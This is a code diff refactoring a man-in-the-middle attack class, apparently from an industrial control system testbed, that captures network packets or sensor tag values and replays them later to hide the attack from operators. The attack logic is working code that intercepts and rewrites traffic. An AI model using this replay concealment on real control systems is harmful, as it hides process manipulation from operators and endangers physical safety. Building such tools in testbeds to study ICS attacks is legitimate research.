@@ -40,21 +40,23 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
             elif self.intermediate_attack['concealment_data']['type'] == 'value':
                 self.concealment_type = 'value'
 
-            elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
-                self.concealment_type = self.intermediate_attack['concealment_data']['type']
-                self.captured_tags_pd = pd.DataFrame(columns=self.get_conceal_tags())
-                self.logger.debug('Tags to be replayed will be: ' + str(self.captured_tags_pd))
-                self.replay_duration = int(self.intermediate_attack['concealment_data']['capture_end']) - \
-                                       int(self.intermediate_attack['concealment_data']['capture_start'])
-                self.logger.debug('Payload Capture and Replay duration is: ' + str(self.replay_duration))
+            elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay' or\
+                    self.intermediate_attack['concealment_data']['type'] == 'network_replay':
 
-            elif self.intermediate_attack['concealment_data']['type'] == 'network_replay':
                 self.concealment_type = self.intermediate_attack['concealment_data']['type']
-                self.captured_packets_pd = pd.DataFrame(columns=['Packet'])
-                self.replay_duration = int(self.intermediate_attack['concealment_data']['capture_end']) - \
-                                       int(self.intermediate_attack['concealment_data']['capture_start'])
-                self.logger.debug('Network Capture and Replay duration is: ' + str(self.replay_duration))
+                self.replay_start = int(self.intermediate_attack['concealment_data']['replay_start'])
+                self.capture_start = int(self.intermediate_attack['concealment_data']['capture_start'])
+                self.capture_end = int(self.intermediate_attack['concealment_data']['capture_end'])
+                self.replay_duration = self.capture_end - self.capture_start
 
+                if self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
+                    self.captured_tags_pd = pd.DataFrame(columns=self.get_conceal_tags())
+                    self.logger.debug('Tags to be replayed will be: ' + str(self.captured_tags_pd))
+                    self.logger.debug('Payload Capture and Replay duration is: ' + str(self.replay_duration))
+
+                if self.intermediate_attack['concealment_data']['type'] == 'network_replay':
+                    self.captured_packets_pd = pd.DataFrame(columns=['Packet'])
+                    self.logger.debug('Network Capture and Replay duration is: ' + str(self.replay_duration))
             else:
                 raise ConcealmentError("Concealment data type is invalid, supported values are: "
                                        "'concealment_value', 'concealment_path', or 'payload_replay' ")
@@ -75,11 +77,9 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
     def handle_attack(self, session, ip_payload):
         if 'concealment_data' in self.intermediate_attack.keys():
-            if self.intermediate_attack['concealment_data']['type'] == 'payload_replay' or \
-                    self.intermediate_attack['concealment_data']['type'] == 'network_replay':
+            if self.concealment_type == 'payload_replay' or self.concealment_type == 'network_replay':
                 current_clock = int(self.get_master_clock())
-                if int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration <= \
-                        current_clock < int(self.intermediate_attack['concealment_data']['replay_start']):
+                if current_clock < self.replay_start or current_clock >= (self.replay_start + self.replay_duration):
                     # With replay concealment, we should not modify payloads, unless we are already replying
                     modified = False
                     return ip_payload, modified
@@ -101,48 +101,45 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                 # elif 'replay' ...
 
     def network_capture(self, ip_payload, current_clock):
-        self.captured_packets_pd.loc[current_clock, 'Packet'] = ip_payload[Raw]
-        self.logger.debug('Captured packet: at ' + str(current_clock))
+        #self.logger.debug('Trying to capture packet...')
+        self.captured_packets_pd.loc[current_clock, 'Packet'] = ip_payload[Raw].load
+        #self.logger.debug('Captured packet:' + str(self.captured_packets_pd.loc[current_clock, 'Packet']))
 
         modified = False
         return ip_payload, modified
 
     def handle_network_replay(self, ip_payload):
-        self.logger.debug('Concealing with network replay')
         current_clock = int(self.get_master_clock())
+        #self.logger.debug('Concealing with network replay')
 
         # Capture phase of the network replay concealment
-        if int(self.intermediate_attack['concealment_data']['capture_start']) <= current_clock < \
-                int(self.intermediate_attack['concealment_data']['capture_end']):
+        if self.capture_start <= current_clock < self.capture_end:
+            self.logger.debug('capturing packet...')
             return self.network_capture(ip_payload, current_clock)
 
-        # Replay phase
-        if int(self.intermediate_attack['concealment_data']['replay_start']) <= current_clock < \
-                int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration:
-            self.logger.debug('Replaying network')
-            replay_position = int(self.intermediate_attack['concealment_data']['capture_start']) + current_clock - \
-                              int(self.intermediate_attack['concealment_data']['replay_start'])
+        if self.replay_start <= current_clock < self.replay_start + self.replay_duration:
+
+            # Replay phase
+
+            replay_position = self.capture_start + current_clock - self.replay_start
 
             # Maybe we did not captured a value for that tag at that iteration
-            if replay_position in self.captured_packets_pd.index and \
-                    (not np.isnan(self.captured_packets_pd.loc[replay_position]['Packet'])):
+            if replay_position in self.captured_packets_pd.index:
                 validated_replay_position = replay_position
             else:
                 # todo: There could be a case where the index exists, but the value is Nan
-                validated_replay_position = min(self.captured_packets_pd.index,
-                                                key=lambda x: abs(x - replay_position))
+                validated_replay_position = min(self.captured_packets_pd.index, key=lambda x: abs(x - replay_position))
 
-            #del ip_payload[IP].chksum
-            #del ip_payload[TCP].chksum
-            ip_payload[Raw] = self.captured_packets_pd.loc[validated_replay_position]['Packet']
-
+            self.logger.debug('Trying to replay: ' + str(self.captured_packets_pd.loc[validated_replay_position]['Packet']))
             modified = True
-            return ip_payload, modified
+            return self.captured_packets_pd.loc[validated_replay_position]['Packet'], modified
 
-    def payload_capture(self, session, ip_payload, current_clock, this_tag):
+        modified = False
+        return ip_payload, modified
+
+    def payload_capture(self, ip_payload, current_clock, this_tag):
         self.logger.debug('Capturing payload of tag ' + this_tag)
-        self.captured_tags_pd.loc[current_clock, this_tag] = \
-            translate_payload_to_float(ip_payload[Raw].load)
+        self.captured_tags_pd.loc[current_clock, this_tag] = translate_payload_to_float(ip_payload[Raw].load)
         modified = False
         self.logger.debug('Captured payload: \n' + str(self.captured_tags_pd.loc[current_clock]))
         return ip_payload, modified
@@ -153,18 +150,15 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
         this_tag = str(session['tag'])
 
         # Capture phase of the payload replay concealment
-        if int(self.intermediate_attack['concealment_data']['capture_start']) <= current_clock < \
-                int(self.intermediate_attack['concealment_data']['capture_end']):
-            return self.payload_capture(session, ip_payload, current_clock, this_tag)
+        if self.capture_start <= current_clock < self.capture_end:
+            return self.payload_capture(ip_payload, current_clock, this_tag)
 
         # Replay phase
-        if int(self.intermediate_attack['concealment_data']['replay_start']) <= current_clock < \
-                int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration:
+        if self.replay_start <= current_clock < self.replay_start + self.replay_duration:
 
             self.logger.debug('Replaying payload')
             self.logger.debug('Captured payloads pd: \n' + str(self.captured_tags_pd))
-            replay_position = int(self.intermediate_attack['concealment_data']['capture_start']) + \
-                              current_clock - int(self.intermediate_attack['concealment_data']['replay_start'])
+            replay_position = self.capture_start + current_clock - self.replay_start
             self.logger.debug('Replay position ' + str(replay_position))
 
             # Maybe we did not captured a value for that tag at that iteration
@@ -180,6 +174,12 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                               + str(concealment_value))
             modified = True
             return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified
+
+        # We could have moments that we are neither capturing, nor replaying
+
+        modified = False
+        return ip_payload, modified
+
 
     def handle_concealment_value(self, session, ip_payload):
         for tag in self.intermediate_attack['concealment_data']['concealment_value']:
